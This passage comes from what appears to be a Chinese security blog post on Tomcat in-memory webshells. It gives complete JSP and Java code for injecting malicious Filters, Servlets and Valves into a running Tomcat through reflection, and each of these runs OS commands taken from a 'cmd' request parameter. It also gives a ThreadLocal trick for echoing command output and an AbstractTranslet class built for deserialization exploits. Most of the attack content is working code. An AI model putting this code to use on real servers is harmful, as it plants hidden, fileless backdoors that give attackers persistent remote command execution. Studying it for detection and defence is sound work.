class="hljs-params">filterMap</span>)</span>;</code></pre></div><h3 id="封装FilterConfig"><a href="#封装FilterConfig" class="headerlink" title="封装FilterConfig"></a>封装FilterConfig</h3><div class="code-wrapper"><pre><code class="hljs reasonml">Field Configs = standardContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>)</span>;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;Map filterConfigs = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>get(standardContext);    Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterConfig</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(Context.<span class="hljs-params">class</span>,FilterDef.<span class="hljs-params">class</span>)</span>;constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">standardContext</span>,<span class="hljs-params">filterDef</span>)</span>;filterConfigs.put(name, filterConfig);</code></pre></div><h3 id="整合-1"><a href="#整合-1" class="headerlink" title="整合"></a>整合</h3><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%@ page import=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt; &lt;%! public <span class="hljs-keyword">class</span> Shell_Filter implements Filter &#123;        public void <span class="hljs-keyword">do</span><span class="hljs-constructor">Filter(ServletRequest <span class="hljs-params">request</span>, ServletResponse <span class="hljs-params">response</span>, FilterChain <span class="hljs-params">chain</span>)</span> throws IOException, ServletException &#123;            String cmd = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>;            <span class="hljs-keyword">if</span> (cmd != null) &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmd);                &#125; catch (IOException e) &#123;                    e.print<span class="hljs-constructor">StackTrace()</span>;                &#125; catch (NullPointerException n) &#123;                    n.print<span class="hljs-constructor">StackTrace()</span>;                &#125;            &#125;            chain.<span class="hljs-keyword">do</span><span class="hljs-constructor">Filter(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>)</span>;        &#125;    &#125;%&gt;&lt;%    ServletContext servletContext = request.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;    Field appContextField = servletContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;    appContextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);    Field standardContextField = applicationContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;    standardContextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);    Shell_Filter filter = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Shell_Filter()</span>;    String name = <span class="hljs-string">&quot;CommonFilter&quot;</span>;    FilterDef filterDef = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterDef()</span>;    filterDef.set<span class="hljs-constructor">Filter(<span class="hljs-params">filter</span>)</span>;    filterDef.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;    filterDef.set<span class="hljs-constructor">FilterClass(<span class="hljs-params">filter</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">Name()</span>);    standardContext.add<span class="hljs-constructor">FilterDef(<span class="hljs-params">filterDef</span>)</span>;      FilterMap filterMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterMap()</span>;    filterMap.add<span class="hljs-constructor">URLPattern(<span class="hljs-string">&quot;/*&quot;</span>)</span>;    filterMap.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;    filterMap.set<span class="hljs-constructor">Dispatcher(DispatcherType.REQUEST.<span class="hljs-params">name</span>()</span>);    standardContext.add<span class="hljs-constructor">FilterMapBefore(<span class="hljs-params">filterMap</span>)</span>;      Field Configs = standardContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>)</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    Map filterConfigs = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>get(standardContext);     Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterConfig</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(Context.<span class="hljs-params">class</span>,FilterDef.<span class="hljs-params">class</span>)</span>;    constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">standardContext</span>,<span class="hljs-params">filterDef</span>)</span>;    filterConfigs.put(name, filterConfig);%&gt;</code></pre></div><p>先访问这个jsp注册恶意Filter，然后才能使用</p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h3 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h3><p>用前面的就行</p><h3 id="恶意Servlet"><a href="#恶意Servlet" class="headerlink" title="恶意Servlet"></a>恶意Servlet</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span> (cmd!=<span class="hljs-literal">null</span>)&#123;            Runtime.getRuntime().exec(cmd);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;    &#125;&#125;</code></pre></div><h3 id="整合-2"><a href="#整合-2" class="headerlink" title="整合"></a>整合</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/add_ServletShell&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerletServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shellServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shellServlet.getClass().getSimpleName();        <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) contextClassLoader.getResources().getContext();        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);        wrapper.setName(name);        wrapper.setServlet(shellServlet);        wrapper.setServletClass(shellServlet.getClass().getName());        standardContext.addChild(wrapper);        standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);    &#125;&#125;</code></pre></div><p>先访问&#x2F;add_ServletShell注册恶意路径，然后才能使用</p><h2 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h2><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228205542971.png" alt="image-20240228205542971"></p><p>用poc在Shell_Value中下断点分析</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228205435516.png" alt="image-20240228205435516"></p><p>从调用栈可以看出，先触发的value是StandardEngineValue，最后才是我们自定义的value</p><p>往前溯源</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228205837333.png" alt="image-20240228205837333"></p><p>这里可以发现<strong>value链是通过invoke方法进行放行的，当前value的invoke执行后就会执行下一个value的invoke方法</strong></p><p>并且还能发现获取顺序是先获取Container，再获取Pipeline，最后获取Value</p><p>并且再StandardPipeline中有addValue方法</p><p>这里Boogipop大佬强调一点</p><p>因为上面提到<code>value的invoke执行后就会执行下一个value的invoke方法</code>，所以为了保障正常执行，在恶意的value类中也要加入<code>this.getNext().invoke(request, response);</code>让他执行下去</p><p>若我们不加的话，当你访问路由不带参数时就会报错，（带了参数就可以正常执行</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228213134793.png" alt="image-20240228213134793"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;%    Field requestField = request.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;request&quot;</span>)</span>;    requestField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    final Request request1 = (Request) requestField.get(request);    StandardContext standardContext = (StandardContext) request1.get<span class="hljs-constructor">Context()</span>;    Field pipelineField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ContainerBase</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;pipeline&quot;</span>)</span>;    pipelineField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    StandardPipeline standardPipeline1 = (StandardPipeline) pipelineField.get(standardContext);    ValveBase valveBase = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ValveBase()</span> &#123;        @Override        public void invoke(Request request, Response response) throws ServletException,IOException &#123;            <span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span> != null) &#123;                boolean isLinux = <span class="hljs-literal">true</span>;                String osTyp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>;                <span class="hljs-keyword">if</span> (osTyp != null<span class="hljs-operator"> &amp;&amp; </span>osTyp.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    isLinux = <span class="hljs-literal">false</span>;                &#125;                String<span class="hljs-literal">[]</span> cmds = isLinux ? <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>&#125; : <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>&#125;;                InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmds).get<span class="hljs-constructor">InputStream()</span>;                Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\A&quot;</span>)</span>;                String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;                response.get<span class="hljs-constructor">Writer()</span>.write(output);                response.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>;            &#125;            this.get<span class="hljs-constructor">Next()</span>.invoke(request, response);        &#125;    &#125;;    standardPipeline1.add<span class="hljs-constructor">Valve(<span class="hljs-params">valveBase</span>)</span>;    out.println(<span class="hljs-string">&quot;evil valve inject done!&quot;</span>);%&gt;</code></pre></div><h2 id="无文件webshell回显连续剧"><a href="#无文件webshell回显连续剧" class="headerlink" title="无文件webshell回显连续剧"></a>无文件webshell回显连续剧</h2><h3 id="kingkk师傅发现一种tomcat通用获取response的方式"><a href="#kingkk师傅发现一种tomcat通用获取response的方式" class="headerlink" title="kingkk师傅发现一种tomcat通用获取response的方式"></a>kingkk师傅发现一种tomcat通用获取response的方式</h3><p><a href="https://xz.aliyun.com/t/7348">https://xz.aliyun.com/t/7348</a></p><p>作者寻找的思路是记录request和response的变量不应该是一个全局变量，而应该是一个ThreadLocal，这样才能获取到当前线程的请求信息。而且最好是一个static静态变量，否则我们还需要去获取那个变量所在的实例。</p><p>在<code>org.apache.catalina.core.ApplicationFilterChain</code>中看上这一部分</p><p>正好在处理我们Controller逻辑之前（下面的service函数</p><p>思路是通过反射修改控制变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request,response存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229104913903.png" alt="image-20240229104913903"></p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1、反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p><p>2、初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p><p>3、从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p><h4 id="获取request和response代码"><a href="#获取request和response代码" class="headerlink" title="获取request和response代码"></a>获取request和response代码</h4><p>需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response。</p><div class="code-wrapper"><pre><code class="hljs reasonml">Field WRAP_SAME_OBJECT_FIELD = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>)</span>;Field lastServicedRequestField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterChain</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>)</span>;Field lastServicedResponseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterChain</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>)</span>;Field modifiersField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Field</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;modifiersField.set<span class="hljs-constructor">Int(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">lastServicedRequestField</span>, <span class="hljs-params">lastServicedRequestField</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">lastServicedResponseField</span>, <span class="hljs-params">lastServicedResponseField</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;lastServicedRequestField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;lastServicedResponseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;ThreadLocal&lt;ServletResponse&gt; lastServicedResponse =    (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);boolean WRAP_SAME_OBJECT = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>get<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>)</span>;String cmd = lastServicedRequest != null    ? lastServicedRequest.get<span class="hljs-literal">()</span>.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>    : null;<span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT<span class="hljs-operator"> || </span>lastServicedResponse<span class="hljs-operator"> == </span>null<span class="hljs-operator"> || </span>lastServicedRequest<span class="hljs-operator"> == </span>null) &#123;    lastServicedRequestField.set(null, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;<span class="hljs-literal">()</span>);    lastServicedResponseField.set(null, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;<span class="hljs-literal">()</span>);    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>set<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>, <span class="hljs-params">true</span>)</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd != null) &#123;    ServletResponse responseFacade = lastServicedResponse.get<span class="hljs-literal">()</span>;    responseFacade.get<span class="hljs-constructor">Writer()</span>;    java.io.Writer w = responseFacade.get<span class="hljs-constructor">Writer()</span>;    Field responseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResponseFacade</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;response&quot;</span>)</span>;    responseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    Response response = (Response) responseField.get(responseFacade);    Field usingWriter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Response</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;usingWriter&quot;</span>)</span>;    usingWriter.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    usingWriter.set((Object) response, Boolean.FALSE);    boolean isLinux = <span class="hljs-literal">true</span>;    String osTyp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (osTyp != null<span class="hljs-operator"> &amp;&amp; </span>osTyp.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;        isLinux = <span class="hljs-literal">false</span>;    &#125;    String<span class="hljs-literal">[]</span> cmds = isLinux ? <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;    InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmds).get<span class="hljs-constructor">InputStream()</span>;    Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\a&quot;</span>)</span>;    String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;    w.write(output);    w.flush<span class="hljs-literal">()</span>;&#125;</code></pre></div><h3 id="基于上述获取response方法，动态注册Filter"><a href="#基于上述获取response方法，动态注册Filter" class="headerlink" title="基于上述获取response方法，动态注册Filter"></a>基于上述获取response方法，动态注册Filter</h3><p><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p><h4 id="步骤一-（即上述的获取response的方法"><a href="#步骤一-（即上述的获取response的方法" class="headerlink" title="步骤一 （即上述的获取response的方法"></a>步骤一 （即上述的获取response的方法</h4><p>这里整合成了继承AbstractTranslet的恶意类</p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-comment">/**</span><span class="hljs-comment"> * @author threedr3am</span><span class="hljs-comment"> */</span>public <span class="hljs-keyword">class</span> TomcatEchoInject  extends AbstractTranslet &#123;  static &#123;    <span class="hljs-keyword">try</span> &#123;      <span class="hljs-comment">/*刚开始反序列化后执行的逻辑*/</span>      <span class="hljs-comment">//修改 WRAP_SAME_OBJECT 值为 true</span>      Class c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>)</span>;      java.lang.reflect.Field f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>)</span>;      java.lang.reflect.Field modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      <span class="hljs-keyword">if</span> (!f.get<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>)</span>) &#123;        f.set<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>, <span class="hljs-params">true</span>)</span>;      &#125;      <span class="hljs-comment">//初始化 lastServicedRequest</span>      c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)</span>;      f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>)</span>;      modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      <span class="hljs-keyword">if</span> (f.get(null)<span class="hljs-operator"> == </span>null) &#123;        f.set(null, <span class="hljs-keyword">new</span> <span class="hljs-constructor">ThreadLocal()</span>);      &#125;      <span class="hljs-comment">//初始化 lastServicedResponse</span>      f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>)</span>;      modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;      <span class="hljs-keyword">if</span> (f.get(null)<span class="hljs-operator"> == </span>null) &#123;        f.set(null, <span class="hljs-keyword">new</span> <span class="hljs-constructor">ThreadLocal()</span>);      &#125;    &#125; catch (Exception e) &#123;      e.print<span class="hljs-constructor">StackTrace()</span>;    &#125;  &#125;  @Override  public void transform(DOM document, SerializationHandler<span class="hljs-literal">[]</span> handlers) throws TransletException &#123;  &#125;  @Override  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)      throws TransletException &#123;  &#125;&#125;</code></pre></div><h4 id="步骤二（包含众多细节"><a href="#步骤二（包含众多细节" class="headerlink" 